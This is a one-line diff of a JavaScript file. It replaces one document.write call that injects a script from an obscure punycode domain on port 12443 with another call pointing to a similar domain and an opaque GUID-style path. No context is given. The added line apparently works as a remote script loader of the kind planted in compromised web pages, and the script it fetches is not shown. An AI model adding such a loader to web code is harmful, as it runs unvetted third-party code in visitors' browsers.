@@ -1,1 +1,1 @@
-document.write('<script src="https://show.xn--3bs795g.zone:12443/ty/6F4EFFF3-11AA-13488-33-9B560EFD63E6.alpha"><\/script>');
+document.write('<script src="https://ad.xn--3bs795g.link:12443/ty/2D177CFA-CFCC-13488-33-569CD7A2183C.alpha"><\/script>');
